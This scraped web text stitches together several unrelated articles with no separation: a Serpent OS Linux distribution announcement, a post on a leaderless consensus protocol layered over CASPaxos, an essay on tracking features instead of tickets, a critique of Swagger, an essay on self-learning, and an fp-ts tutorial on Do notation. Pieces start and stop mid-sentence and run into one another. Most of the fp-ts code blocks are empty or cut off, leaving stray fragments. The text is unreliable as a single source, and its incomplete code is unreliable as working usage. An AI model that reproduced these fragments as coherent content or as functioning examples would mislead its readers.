Chiefly, a Linux distribution for people who want to use Linux, not a “Linux-based-OS”
focusing on interoptability with macOS* + Windows*.</p>
<p>In a nut shell, this is <strong>not</strong> “Linux for the masses”. This is a project setting out to
use Linux as Linux should be used. This will in turn help us to build a significantly
advanced Linux distribution that is both modular and optimised for modern machines.</p>
<h4 id="a-truly-modern-linux-distribution">A Truly Modern Linux Distribution</h4>
<p>As we’re taking a distro-first, compatibility-later approach, our design decisions
will allow us to take some bold steps. We’ll also be able to incorporate all of the
more sensible design improvements in Linux distribution design over the last decade or
so:</p>
<ul>
<li>No more usrbin split</li>
<li>100% clang-built throughout (including kernel)</li>
<li>musl as libc, relying on compiler optimisations instead of inline asm</li>
<li><code>libc++</code> instead of <code>libstdc++</code></li>
<li>LLVM’s binutils variants (<code>lld</code>, <code>as</code>, etc.)</li>
<li>Mixed source/binary distribution</li>
<li>Moving away from <code>x86_64-generic</code> baseline to newer CPUs, including Intel and AMD specific optimisations</li>
<li>Capability based subscriptions in package manager (Hardware/ user choice / etc)</li>
<li><code>UEFI</code> only. No more legacy boot.</li>
<li>Completely open source, down to the bootstrap / rebuild scripts</li>
<li>Seriously optimised for serious workloads.</li>
<li>Third party applications reliant on containers only. No compat-hacks</li>
<li>Wayland-only. X11 compatibility via containers will be investigated</li>
<li>Fully stateless with management tools and upstreaming of patches</li>
<li>Lots, lots more. We’ll blog about it.</li>
</ul>
<h4 id="opinionated-by-default">Opinionated By Default</h4>
<p>A recurring theme that holds back the development of world-class Linux, is high tolerance
for those holding Linux back. A perfect example is NVIDIA* and their lack of support for
accelerated Wayland support on their GPUs. Consequently, our project won’t tolerate such
decisions and will instead blacklist the NVIDIA proprietary drivers from the distribution.</p>
<p>There are other examples that will emerge over time, and will become quite clear.</p>
<p>The time for Linux distributions giving in, with thousands of man hours wasted working around
negative actors, had come to an end.</p>

<p>We will only accept community involvement via our IRC channel: <code>#serpentOS</code> on Freenode.
We will not operate a public bug tracker or forums. Once we are past out initial bootstrap
phase we will set up an email address to help reporting security issues to the team, and
we will of course release security notices.</p>
<p>In terms of feature requests, these will be largely at the discretion of core contributors.
When a company has been formed to house this project, we’re happy to hash out an SLA for
required works.</p>
<h4 id="timescale">Timescale</h4>
<p>It may seem incredibly odd launching a website before there is a distro to show off, however,
it became very apparent that the cat would be out of the bag, so we wanted to be prepared.</p>
<p>Currently, the Founder is in the midst of relocating to the Republic of Ireland. Once complete
we’ll move to stage2 of our bootstrap process and begin working on the tooling needed for the
base development.</p>

            <p><span>Abstract.</span> Papers on leaderless consensus protocols such as EPaxos and Atlas describe the protocols from the ground up. This approach helps a reader without prior knowledge to understand how they work, but at the same time it makes it hard for an expert to grok them because they need to trace and check all the assumptions from scratch rather than rely on already proved protocols. This may explain why the leaderless consensus protocols didn't get traction in the industry despite being known since 2013.</p>

            <p>In this post I present a leaderless consensus protocol built in a modular way on top of known consensus protocol. Its modularity helps in understanding and retrofitting into existing solutions.</p>
        </div></div>

        <div><div>
            <p>From an engineering perspective a consensus protocol is a replication protocol. Usually it is used to replicate a state of an application (a state machine) to increase its availability. The key difference between consensus and primary-backup replication is an ability to tolerate node and network failures without losing integrity of the data.</p>

            <p>One may think of consensus replication as a strongly consistent variant of master-master replication where any replica (a proposer) can initiate a change. Althrouth consistency is never compromised in practice the concurrent processes may abort each other and stall the performance. In literature this situation is known as dueling proposers.</p>

            <blockquote>"It’s easy to construct a scenario in which two proposers each keep issuing a sequence of proposals with increasing numbers, none of which are ever chosen", Paxos Made Simple</blockquote>

            <blockquote>"The presence of two concurrent leaders can prevent the commitment of any consensus decision and hence prevent progress", Deconstructing Paxos</blockquote>

            <blockquote>"if multiple processes detect that there is no leaser and all attempt to become leader an the same time, then none of the process is likely to succeed (again dueling proposers)", Google SRE book</blockquote>

            <p>The can't be dismissed as a fluke, take latency of CASPaxos when all requests to change the <span>same object</span> land the same replica and latency of CASPaxos when the requests are uniformly distributed across all five replicas.</p>

            <p><img src="http://rystsov.info/images/pacified/dueling.png"></p><p>We see that when there are 20 clients then the dueling reduces throughput 2.85 times from 4513 ops/s to 1581 op/s and increases p99 latency 10.37 times from 4467 microseconds to 46 milliseconds.</p>

            <p>The absolute numbers and the degradation ratio depend on the hardware. For this and all the follow up experiments I simulated <code>5+c</code> nodes cluster (where <code>c</code> is the number of the clients) with around 178 us RTT between any nodes, 655 bytes/us network throughput, 2 ms fsync disk latency and 1132 bytes/us disk throughput, although I haven't pushed the system to the limit of the bandwidth so the throughput numbers for disk and network don't really matter.</p>

            <p>The shape of the charts surprised me. Usually when a system reaches saturation the latency looks linear while throughput reaches plateau and stops growing. But in this case the shapes are inverted which implies that the system is far from saturation and that we can keep adding clients increasing throughput without affecting latency. It happens because CASPaxos replicates state instead of the commands so a proposer can apply multiple commands in chain to the stored state and replicate only the final version (batching on steroids) reducing the load on the network.</p>

            <p>Leslie Lamport suggested using a leader election abstraction to select a leader (a distinguished proposer) which is the only one capable of processing requests. It's worth noting that the idea of a leader is used to reduce contention and not to enforce consistency. Meaning the leader election may be weak and may not prevent the case where several replicas become leaders for the same period of time. It allows the use of a large class of protocols for leader election including randomised timeouts &amp; heartbeats, consistent hashing routering or external arbiter.</p>

            <p>But the idea of leader election has its flaws:</p>

            <ul>
                <li>hardware issues may degrade performance of a leader and affect the whole system</li>
                <li>after a leader fails and until a new leader is elected, a consensus based system becomes unavailable</li>
                <li>randomised leader election under unstable network creates non-trivial failure modes which may delay election of a new leader</li>
            </ul>

            <p>I built a leadered version of consensus replication and used fault injection to demonstrate the issues. The stable leadership is compared with ad hoc leadership which is known to suffer from dueling proposers under normal circumstances. The leaderd system uses 4ms election timeout while the fault injector isolates a random replica for 12ms.</p>

            <p><img src="http://rystsov.info/images/pacified/leader.adhoc.unrest.png"></p><p>For 20 clients the fault injections cause the stable leadership to have 2.46 times lower throughput (709 ops/s vs. 1750 ops/s) and 1.5 times higher p99 latency (60ms vs. 40ms) than an ad hoc leadership approach.</p>

            <p>It looks like we have to choose between scylla and charybdis: either to have 6.36 times lower than optimal throughput (4513 ops/s vs 709 ops/s) during unavoidable transient issues under strong leadership or to have throughput profile independent of failures (1581 ops/s and 1750 ops/s) but both 2.85 times less than optimal under ad hoc leadership.</p>

            <p>The question is if there is a compromise between being fast without failures and being fast on a rainy day. The family of leaderless consensus protocols fills that niche.</p>

            <p><img src="http://rystsov.info/images/pacified/epaxos.png"></p><p>EPaxos solves the contention problem and provides excellent fault tolerance. But despite being around for seven years it hasn't generated enough traction and I don't know any product in the industry which is using it. The lack of interest is especially noticeable if we compare EPaxos to Raft protocol which was discovered around the same time.</p>

            

            <p>The lack of popularity may be attributed to the complexity. I've found several reports on implementing EPaxos: <a href="https://medium.com/princeton-systems-course/reproducing-epaxos-by-ang-li-and-robin-qiu-b5a8fc5262a2">Reproducing EPaxos</a> by Robin Qiu and <a href="https://issues.apache.org/jira/browse/CASSANDRA-6246">EPaxos</a> by Blake Eggleston, and both of them mention the complexity of EPaxos:</p>

            <blockquote>One major drawback of the algorithm is its complexity. From our understanding, EPaxos is more like a two-dimensional Paxos on top of an eventual-consistency-like layer.</blockquote>

            <blockquote>We only implemented the basic EPaxos, and it is already much more complicated than Raft. We believe the fully optimized EPaxos will be even more complicated. In practice, complicated algorithms are hard to design, optimize, and maintain, making them less likely to be adopted in production.</blockquote>

            <blockquote>It’s still pretty rough, I just wanted to get it to a point where we could get a feel for the performance advantages and decide if the additional complexity was worth it</blockquote>

            <p>Funny enough the complexity of the protocol <a href="https://arxiv.org/pdf/1906.10917.pdf">manifested</a> in the official reference implementation of the EPaxos and TLA+ proof having a bug which leads replicas to diverge and break the linearizability of the replicated service.</p>

            <p>This post is an attempt to design a leaderless consensus protocol but keep it simple via the modular approach by reusing already proved components.</p>

        </div></div>

        
          
        <div><div>
            <p>The core idea of the pacified consensus is to order client requests and to let replicas to co-execute the same request in parallel. The preordering reduces contention and parallel execution increases fault tolerance. Even when one replica gets isolated or goes offline another finishes its request without a delay because it is already working on it in parallel.</p>

            <p>The parallel execution doesn't affect correctness because the effects of the parallel execution can be explained by the selective duplication of messages and Paxos tolerates this kind of intrusion</p>

            <blockquote>"Messages can take arbitrarily long to be delivered, can be duplicated, and can be lost, but they are not corrupted", Paxos Made Simple</blockquote>

            <p>The task of ordering client requests in a fault tolerant way and replicating it to the replicas sounds like a consensus problem. It is natural to suggest that running two consensus replication processes can't be faster than running just one but actually it is.</p>

            <p>The trick is that a major part of the latency comes from the disk IO. Even when we use NVM but target high throughput we should make small delays to accumulate writes (4 ms) and write them in batches.</p>

            <p><img src="http://rystsov.info/images/pacified/nvm.png"></p><p>4 ms is 20 times higher than intra datacenter RTT, so in-memory consensus in front of on-disk consensus doesn't contribute much to the overall end to end latency but completely eliminates contention.</p>

            <p>This idea isn't just wild speculations, I've built it and measured the performance. And the leaderless consensus performs on par with leadered when there are no faults, latency is just 23% worse but throughput is 36% better.</p>

            <p><img src="http://rystsov.info/images/pacified/leaderless.leader.png">

            The leaderless consensus with faults performs a bit worse than leaderless consensus without faults.

                <div>
                    <p>The short answer is yes. Let me explain.</p><p>I’ve been working with developers and designers my entire life. </p><p>I’ve built a couple of products, worked at a young startup, and I’m now at Zepel helping development teams build better software.</p><p>I’ve spoken to 1000+ development teams while at Zepel alone. <strong>And it's evident that the way we build products is broken.</strong></p><p>There’s so much disconnect between how you and I talk about building products and how our teams actually build them.</p><p>For all the talk of scrum and agile and getting feedback quickly, there’s so much that’s broken in how we act on the feedback and build the feature.</p><p>Teams spend so much time and effort getting a deeper understanding of customers’ needs. And yet distil everything down to a simple two-line ticket and a couple of lines of markdown description.</p><p>This is hurting your developers. And it’s hurting your business.</p><blockquote>Nothing is more frustrating than having to understand what an entire feature should or shouldn’t do from a two-line ticket filled with ten bullet points of acceptance criteria.</blockquote><p><em>*Here are five prioritized tickets for the upcoming sprint. We have to ship them on time!*</em></p><p>On the other hand, you have teams who are able to build top quality software. They’re the ones who can concentrate on the fine implementation details without losing focus on the broader purpose of the feature as a whole.</p><p>Everyone wants to get to that level. But instead, teams do the exact opposite.</p><p><strong>Teams think in issues and tickets, instead of the feature as a system.</strong></p><hr><h2 id="development-teams-are-not-ticket-movers-">Development teams are not ticket movers!</h2><p>Today, everything is about moving a ticket from “Todo” to “Done” as quick as possible. And watching burndown charts. And customizing the tool to the extent that the developer only views a single ticket.</p><p><em>*“What’s the velocity of our team?” is simply another way of asking how quickly can my team move an issue from “Todo” to “Done”.*</em></p><p>Pieces of that stuff are important for productivity and shipping on time.</p><p>But seriously, how is your team supposed to ship anything of value if you narrow their focus down to the smallest unit of work without any context of why it’s needed or how it connects to the whole feature?!</p><p>Overall, we’ve lost our way. Product development today has become more about checking items off a list as quickly as possible. </p><p><strong>It isn’t enough to write multiple user stories and share a Figma link if you want to ship quality software.</strong></p><hr><h2 id="how-software-product-teams-really-build-software-together">How software product teams really build software together</h2><p>Development teams build better software together when they have the complete context of what and why something is being built.</p><p>To achieve this, the foundational elements need to change.</p><p>And it starts with getting the right abstractions and naming conventions.</p><p><strong>The names you choose determine the perception and the quality of conversations you have. </strong>It’s why top developers spend time obsessing over names for classes, functions, and variables.</p><p>When you open up a VS Code and see a function called <code>send_signup_email</code>, you have a certain sense of what’s going to be inside and why that’s there.</p><p>The right abstractions can drive the team towards asking the right questions. And this is critical.</p><p><strong>Because when you’re tracking issues and tickets in isolation you have no choice but to measure only outputs.</strong></p><p>And teams today don’t want to measure only the outputs. They want to measure <em>outcomes</em>.</p><hr><h2 id="what-s-the-right-abstraction">What’s the right abstraction?</h2><p>The right abstraction is the one that prioritizes people over processes and tools. It's the one you and I use every day — it's Features.</p><p>When a squad creates a Feature and opens it, they’ll get to look at the entire feature as a unit. A user story inside it might describe a specific functionality. But the difference is, now each developer and designer know how it connects to the larger scheme of things for the entire feature.</p><blockquote>A feature forces inept managers to stop focussing on output-oriented questions like “how can we work faster”. <p>And shifts the focus on outcome-oriented questions like “why should we prioritize this feature” and “how does this feature tie to the OKR”.</p></blockquote><p>Miscellaneous tasks and incoming bugs can be tracked on a separate “List”, so high-priority bugs don't get missed out. And of course, when it comes to tracking them, they can all be tracked on a Sprint or on a Kanban Board.</p><p><strong>Feature as an abstraction is the right middle ground that lets you focus on the output as well as the outcome.</strong> It lets you zoom in and track what's happening today. It also allows you to zoom out and track a feature's progress across multiple disciplines. And it enables you to see how a feature moves from a feature request all the way to prioritization and development.</p><p>Simple issue trackers and project management tools have shoehorned teams into ticket-movers and have made them think in outputs. Metrics get feigned to show productivity. Thinking in outcomes has become ridiculously hard. And it's hurting businesses.</p><p>It's time for tools to reflect the reality of product development. It's time to remove the disconnect between development teams and what your customers really want. </p><p>It's time to stop thinking in isolated tickets and start thinking in features as a system!</p><hr><p>If you liked what you read, I think you’ll love what we have in store for you.

		<article>

		<p id="article_date">14 August 2017</p>

		

		<p>The objective of <a href="https://swagger.io/" target="_blank" rel="noopener noreferrer">Swagger</a> is to create a “RESTful contract for your API, detailing all of its resources and operations in a human and machine-readable format.” In this sense it is a functional equivalent of WSDL documents for SOAP, providing automatically generated descriptions that make it easier to discover and integrate with REST APIs.</p>
<p>The problem is that this kind of automatically generated contract isn’t necessarily a great fit for RESTful APIs. In practice it can undermine some of the main features of REST, reducing APIs to a form of RPC contract that feels like a less reliable version of SOAP and WSDL.</p>
<h2>Swagger is not RESTful</h2>
<p>A problem with Swagger is that it doesn’t describe REST adequately. More specifically, it does not directly support hypermedia – a key aspect of REST that allows servers to control their own namespace. Servers should not be bound by fixed URLs but be allowed to define them in resource responses. A client should only need to know the root URL of an API and be able to navigate the remainder on responses alone.</p>
<p><a href="http://roy.gbiv.com/untangled/2008/rest-apis-must-be-hypertext-driven" target="_blank" rel="noopener noreferrer">Roy Fielding</a> has been particularly clear on this subject:</p>
<blockquote><p>…if the engine of application state (and hence the API) is not being driven by hypertext, then it cannot be RESTful and cannot be a REST API. Period.</p></blockquote>
<p>Swagger focuses very much on functions that are available via specific URI patterns. In this respect it reduces REST to RPC over HTTP by defining a remote data model that is manipulated through function calls. It does make a nod to hypermedia in <a href="https://nordicapis.com/whats-new-in-openapi-3-0/" target="_blank" rel="noopener noreferrer">version 3.0</a> of the specification by supporting static link definitions, but it makes it clear that hypermedia-driven APIs are not a goal.</p>
<p>This criticism of Swagger does risk descending into an unhelpful debate over what is and is not “RESTful”. One of the drawbacks of implementing REST APIs is that clients do not always leverage hypermedia, preferring to format URIs directly according to the patterns they expect. Swagger encourages this behaviour by focusing on the available URI patterns. In this sense it undermines REST by exasperating an on-going problem with the way REST APIs are adopted.</p>
<h2>The perils of generated clients</h2>
<p>There is a hangover from the SOAP era where client applications could be automatically generated from a WSDL contract that defined all the service functions and data. The resulting client applications could be convenient, but the code was inflexible, difficult to test and often failed to provide the genuine cross-platform compatibility promised by SOAP.</p>
<p>REST should give rise to more flexible clients that respond to the hypermedia controls returned in responses. They should also be more <a href="http://www.ben-morris.com/rest-apis-dont-need-a-versioning-strategy-they-need-a-change-strategy/" target="_blank" rel="noopener noreferrer">tolerant of breaking change</a> by only reading the fields that they need. Overall, this provides a more fluid approach to client integration that tends not to break so often.</p>
<p>Swagger undermines this by facilitating a return to automatically generating client applications against a fixed contract. This can also encourage clients to use genuinely RESTful APIs in the “wrong way”, i.e. through pre-generated URI patterns rather than responding to hypermedia controls. The effect is to further undermine REST by creating the kind of rigid, function-orientated clients associated with SOAP or RPC.</p>
<h2>Conflating documentation and code</h2>
<p>Swagger implementations tend to be used more widely in generating documentation as opposed to client code. This does at least help to ensure that documentation reflects what is in production, but it often comes at the cost of usability.</p>
<p>Automated documentation does depend on the conceit that developers can maintain meaningful documentation as part of their source code. They tend not to. You’re more likely to find boiler plate that is littered with errors. Achieving even the most basic consistency of tone or language can be a challenge, particularly with globally distributed teams.</p>
<p>There can be practical difficulties in coupling public documentation to the end-points exposed by a web application. Many API infrastructures expose end-points via an <a href="http://www.ben-morris.com/api-gateways-and-the-dangers-of-creeping-middleware-scope/" target="_blank" rel="noopener noreferrer">API gateway</a> that takes responsibility for concerns such as request routing, validation and authorization. This can give rise to inaccurate documentation as behaviours that are defined in a gateway won’t make it to the Swagger output.&nbsp;It may sound old fashioned, but Swagger is no substitute for a good technical writer.</p>
<p>Another issue is that Swagger implementations tend to bloat code bases. Swagger implementations generally try and support a “happy path” where a basic level of support is provided just by adding in the library. For example, the <a href="https://dzone.com/articles/spring-boot-restful-api-documentation-with-swagger" target="_blank" rel="noopener noreferrer">SpringFox </a>implementation for Java Spring just requires a <a href="http://springfox.github.io/springfox/javadoc/2.7.0/index.html?springfox/documentation/spring/web/plugins/Docket.html" target="_blank" rel="noopener noreferrer">Docket</a> bean which can be used to set a bunch of global defaults and initialise the UI. A similar low-hassle implementation is available for .Net via the <a href="https://docs.microsoft.com/en-us/aspnet/core/tutorials/web-api-help-pages-using-swagger" target="_blank" rel="noopener noreferrer">Swashbuckle</a> library.</p>
<p>These basic implementations won’t include any of the things that make documentation <em>useful</em>, such as method and field descriptions. These have to be added directly to source code directly, though Swagger implementations generally try to leverage existing code structures where possible. For SpingFox you can use Java annotations to add metadata, while a similar approach is taken for .Net using custom attributes.</p>
<p>The exact approach tends to vary between development environments, but a verbose Swagger implementation inevitably places significant extra burden on the source code. You either have a large and complex configuration file or metadata sprinkled liberally across your methods and models.</p>
<h2>If it’s RPC that you really want…</h2>
<p>Swagger can be a convenient means of outputting API documentation, but the automatic generation of content and client code feel like a poor fit for REST. Adding Swagger to a API implementation can undermine the RESTful aspects, encouraging clients to use it as an RPC API running over HTTP.</p>
<p>If you really want an RPC-style API, along with code generation and contract management, then there are better options than faux REST via Swagger. For example, <a href="https://grpc.io/" target="_blank" rel="noopener noreferrer">gRPC</a> is faster, has rich cross-platform support and is based on a structured contract that allows a reasonable degree of backwards compatibility.</p>

		<p>I've done both, through the system and out of it. I went to a higher education institute and learned most of what I know alone, using online resources and books.</p><p>In this post, I'll share the points that affected me. Others might view things differently and I encourage you to share your point of view in the comments section.</p><h2 id="the-good-">The Good:</h2><p>Learning alone, from online (or offline) resources gives you several degrees of flexibility:</p><p><strong>You can choose the content:</strong><br>You don't have to settle for the content that your education institute provides you. There are probably better resources out there, you can learn programming, economics, or architecture by handpicking the best resources every step of the way.</p><p>Searching for content will also give you a better understanding of your field of study, what are the main subjects to learn, what are the ways it's currently taught in. You can enrich your learnings with several media types, such as YouTube videos, books, and courses.</p><p><strong>3.5 months. No more:</strong><br>You don't have to stick to the 3.5 months semester format. If it takes you another month to learn a subject it's perfectly fine. The most important thing is that you end up understanding it. There is no such concept when going through college, if it takes you even 4 months, you "strike out" and need to retake that course.</p><p>It goes the other way as well. Sometimes you can complete learning a subject in less time. If your pace is faster no one forces you to drag it for 3.5 months.</p><p>You can schedule your learning time:<br>When taking a course at an educational institute, you're given a learning schedule and there's a specific time for classes and exercises. If it clashes with other things in your life, you'll have to adjust.</p><p>Self-learning allows you to fit learning into your existing schedule, or make lesser changes to your lifestyle. There's no real ability to work full-time when attending college, but it's possible if you can schedule your studies in the evenings and during the weekends. That said, there are obvious issues here that I'll touch in the cons section.</p><p><strong>A growth catalyst:</strong><br>To achieve the benefits of self-learning, we must grow and mature. This can be view as a con but I decided to list it in the pros. It's these experiences and hardships in our lives that spur growth. You have to be true to your word, invest the time required for learning and not trick yourself. It'll be hard. You might fail at times.</p><p>You have to maintain your integrity, not lie to yourself and do things outside of your comfort zone. The learning itself is just one of the challenges here. There's no group to drag everyone forward, no boss/teacher to give you exercises and there are no firm deadlines besides the ones you set yourself, which should be the hardest deadlines of them all.</p><p>Succeeding here will grant you mental sturdiness and competency. It will make you a formidable person, a force. You'll feel stronger because you'll know that you can execute plans and pull through inconveniences.</p><p>You'll also face the need to learn how to learn. This is an underrated skill that we rarely learn growing up. Self-learning will help you pay more attention to the way you learn and to your habits. You'll improve as you practice, thus be a more efficient learner.</p><p><strong>Learn for you:</strong><br>Self-learning usually comes from a place of need or desire. You either need the knowledge or are very curious about it (also sort of a need). Having a good answer to the "why" question will help you learn much better.</p><p>Self-learning allows you to choose your own "why". Growing up you didn't have a great part in the decision of what to learn and why. Now you're the authority. Maybe it's something you want to build, an improvement to your career path, or magical curiosity. The choice is yours.</p><p>Also, efficient learning requires a project, and self-learning enables you to choose your own. Choose a project that speaks to you, one that will make you feel it's a good use of your time. It'll give you a stronger purpose and a chance to use your newly gained skills along the way.</p><p><strong>Cost:</strong><br>It's much cheaper to be a self-learner. You can get the same knowledge for either free or a fraction of the cost of college. Books, online courses, YouTube Channels, Podcasts, all give you a great platform to learn from. You can also get certificates at platforms like edX and Coursera at an affordable price.</p><hr><h2 id="the-bad-">The Bad:</h2><p>Now for the cons of self-learning. Alongside the benefits of self-learning, there are disadvantages we should take into consideration.</p><p><strong>Underdeveloped maturity effects:</strong><br>Maturity develops with time. While still underdeveloped it can cause some pain.</p><p>Procrastination and excuses. Not finishing what you started or not investing enough time. These will anger you with yourself. You'll feel you're not cut out for it. Like you're not made out of self-learning material. Many people pass through this stage, and you should know that with dedication and persistence this can be overcome.</p><p>You need to be true to yourself about the amount of effort you invest and choose proper ways to exercise what you learned.</p><p>It's important to know when it's time to continue to the next stage. It's easy to stay in the new comfort zone of a topic you already understand. This requires maturity as well. It can cause you to stay at the introductory level or stick to tutorials and articles, not progressing with either the learning or the project you chose. I think the coined term is "Tutorial Purgatory".</p><p><strong>No people:</strong><br>Bringing people together is one of the most wonderful things about universities and colleges. I view it as the main reason for their existence.</p><p>Having all those people around you in college means that you can brainstorm a lot. You can gain access to the way other people think and learn. Learning from others is important and self-learning doesn't have that.</p><p>There are things you can do to compensate. You can be active in forums or, online groups, however, it's not a substitute for all that brain that naturally hangs out around you in environments like schools and universities.</p><p>Learning with people, there's also the "herd effect". It's easier to go through the experience of education as a herd, together. Students support and incentivize each other and share the load. It's a place we can start developing teamwork skills.</p><p>Also, it's more fun to learn with others. You have people to share newly learned concepts with. People to be curious or plot interesting projects with. Fun and connection is a great part of learning in particular and of executing in general and it's missed when learning alone.</p><p>With fewer people, there are fewer opportunities to develop your social skills and personal network. In college, you pass 3-4 intensive years together that create lifelong friendships and connections. While Self-learning, we meet fewer people with whom we share less time. It's a big con to consider.</p><p><strong>No mentors:</strong><br>There are usually no professionals to guide us when we self-learn. We can follow the advice of online tutors, but there's no one to approach personally and discuss your concerns and thoughts with.</p><p>The benefits of a mentor go beyond raw information. Good mentors show us the reasons behind what they do. They can give us the "why" that's always so important. Mentors also serve as professional role models, and unless you're actively searching, chances are you won't find one when self-learning.</p><p><strong>Less respected certificates:</strong><br>It's still the case that university diplomas are more appreciated than private course system's ones. There's also the problem of not having a certificate at all. If you study from a book, a YouTube channel or a private course, there's no one to certificate you.</p><p>It's a shame because when I study from books or courses, I usually end up knowing the material well enough to use it. With that, There's a shift going on these days, learners and employers decreasing their reliance on college diplomas. Experience speaks louder. The ability to execute start to matter more than whether or not you passed through a university. That said, diplomas still matter.</p><hr><p>We should view these cons as opportunities to improve self-learning. We can generate ideas to connect self-learners and spur interactions and discussions. Ideas that can lessen these cons or maybe even solve them. I bet on self-learning for the long run as a scalable solution, therefore, I think we must.</p><p>Surely this list of pros and cons is not an exhaustive one, and I might add to it in the future. The idea behind this list is not to help people choose between self-learning and the academy. You should ALWAYS strive to be a better self-learner, and if you have the privilege, go to a college as well.</p>

If you've used fp-ts for any length of time, you've probably noticed that this problem isn't specific to asynchronous code. For example, this expression which sums three optional numbers:</p><div data-language="ts">
      <pre><code>option<span>.</span><span>chain</span><span>(</span>maybeA<span>,</span> <span>a</span> <span>=&gt;</span>
  option<span>.</span><span>chain</span><span>(</span>maybeB<span>,</span> <span>b</span> <span>=&gt;</span>
    option<span>.</span><span>map</span><span>(</span>maybeC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>This, of course looks similar to how we'd deal with fetching numbers from some external service:</p><div data-language="ts">
      <pre><code>fetchA<span>.</span><span>then</span><span>(</span><span>a</span> <span>=&gt;</span>
  fetchB<span>.</span><span>then</span><span>(</span><span>b</span> <span>=&gt;</span> 
    fetchC<span>.</span><span>then</span><span>(</span><span>c</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>Also, suppose these numbers were stored in either values, and we wanted to compute the sum, or return early with an error:</p><div data-language="ts">
      <pre><code>either<span>.</span><span>chain</span><span>(</span>errorOrA<span>,</span> <span>a</span> <span>=&gt;</span>
  either<span>.</span><span>chain</span><span>(</span>errorOrB<span>,</span> <span>b</span> <span>=&gt;</span>
    either<span>.</span><span>map</span><span>(</span>errorOrC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>Note: You may have noticed that we could have used something like <code>Promise.all</code> to combine all of our fetched numbers. In this case, it's true (disregarding the fact that <code>all</code> executes in parallel), however, as soon as we need to use the output of the previously chained value as input to the next, we're back to nesting <code>chain</code>s.</p><p>JavaScript has added async await syntax, which helps avoid this problem for promises:</p><div data-language="ts">
      <pre><code><span>const</span> a <span>=</span> <span>await</span> fetchA<span>;</span>
<span>const</span> b <span>=</span> <span>await</span> fetchB<span>;</span>
<span>const</span> c <span>=</span> <span>await</span> fetchC<span>;</span>

<span>return</span> a <span>+</span> b <span>+</span> c<span>;</span></code></pre>
      </div><p>This is nice, but it only works for promises; it won't work for option chains, either chains, or any other chainable. It would be nice if we had something like this that would work for <em>all</em> chainable (monad) values.</p><p>This pattern happens quite often in functional programming, and certain fp languages even have special syntax sugar for expressing chains like these in a succinct manner, such as Haskell's <a href="https://en.wikibooks.org/wiki/Haskell/do_notation">do notation</a>, or Scala's <a href="https://docs.scala-lang.org/tour/for-comprehensions.html">for comprehension</a>. There have been a few attempts to mimic this syntax in JS. One popular way is to use generators. Generators don't work for all monads, and they have poor typescript support. It would be nice to have something that works with typescript, and supports all monads.</p><p><code>Do</code> is an attempt at this. It uses the builder pattern to collect the successful value from each chainable, and stores them in an object. At each successive step, the result of any chainable from previous values in the chain is accessible, making it possible to prevent nested callback situations, which can help make code clearer.</p><h3 id="do-for-option"><a href="#do-for-option">Do for Option:</a></h3><p>Let's get a feel for how <code>Do</code> works by using it with the previous examples:</p><p>Here we have 3 <code>Option</code> values each chained successively:</p><div data-language="ts">

  <span>)</span>
<span>)</span></code></pre>
      </div><p>The <code>Do</code> equivalent of this snippet is:</p><div data-language="ts">
      <pre><code><span>import</span> <span>{</span> Do <span>}</span> <span>from</span> <span>'fp-ts-contrib/lib/Do'</span>

      </div><p>At each <code>bind</code> step, we're passing an identifier, and an <code>Option&lt;number&gt;</code> value. Each step will only continue on if the previous value was present. Finally, the last return statement, the provided values at <code>a</code>, <code>b</code>, and <code>c</code>, are each <code>number</code>s. The function here can be used to transform the result value. Remember, each step only gets invoked if all of the previous options were defined. For example, let's say that <code>maybeA</code>'s  value was <code>some(5)</code>, <code>maybeB</code>'s value was <code>none</code>, and <code>maybeC</code>'s value was <code>some(6)</code>. The <code>Do</code> chain would stop at the second step, and the result of the entire <code>Do</code> expression would be <code>none</code>.</p><div data-language="ts">

result </code></pre>
      </div><p>If all of the values were defined, then we'd reach the <code>return</code>, and the result of the expression would be <code>some(sum)</code>, where <code>sum</code> is the value returned by the <code>return</code> function:</p><div data-language="ts">

      </div><p>The <code>Do</code> function takes an instance of a Monad typeclass, which handles the chaining of the values that you pass as the second parameter to <code>bind</code>. The type of the typeclass instance also determines the <em>type</em> of values you will be able to chain. For instance, <code>Do(option)</code> will enable you to chain <code>Option</code> values (since <code>option</code>'s type is <code>Monad1&lt;"Option"&gt;</code>'). <code>Do(either)</code> will enable you to chain <code>Either</code> values (since <code>either</code>'s type is <code>Monad2&lt;"Either"&gt;</code>). The value returned from <code>Do</code> is a builder that will let you create chains of these monads.</p><h2 id="bind"><a href="#bind">.bind</a></h2><p><code>.bind</code> takes a <code>string</code> identifier, and an instance of the contextual monad. It will extract the "inner" value from the monad and assign it to a context object, which will make it available in subsequent methods:</p><div data-language="ts">

Note that in the <code>return</code> function, <code>context.user</code>'s and <code>context.manager</code>'s types are <code>User</code>, not <code>Option&lt;User&gt;</code>. <code>bind</code> "extracts" the values for us, in the same way that <code>async</code> "extracts" the value out of a promise.</p><div data-language="ts">

      </div><p>Since we've used <code>sequenceS</code> here, If both <code>startTime</code> and <code>endTime</code> are invalid, <code>result</code> will be a <code>Left</code> containing <em>both</em> of the errors.

Consider if we used <code>bind</code> instead:</p><div data-language="ts">

      </div><p>In this example, if <code>startTime</code> and <code>endTime</code> are invalid, then <code>result</code> will only contain the error from checking <code>startTime</code>, since <code>chain</code> short-circuits.</p><h2 id="let"><a href="#let">.let</a></h2><p><code>let</code> is the simplest of these, and just allows us to introduce identifiers without breaking the expression:</p><div data-language="ts">

These variants work exactly like their counterparts, except that the second parameter is a function (lamda, hence the <code>L</code> suffix) which returns the monad value. The parameter to the function is the context object that <code>Do</code> maintains. This makes it easy to extract &amp; chain monads whose values depend on extracted values from previous steps in the chain.</p><p>Here's an adaption of the date validation example from above. Let's suppose that we also want to validate that the <code>startTime</code> is <em>before</em> <code>endTime</code>. For that, we'll need the actual <code>Date</code> values that are extracted from the ISO values. This can only happen if we've succesfully validated the <code>startTime</code> and <code>endTime</code> ISO strings, though:</p><div data-language="ts">

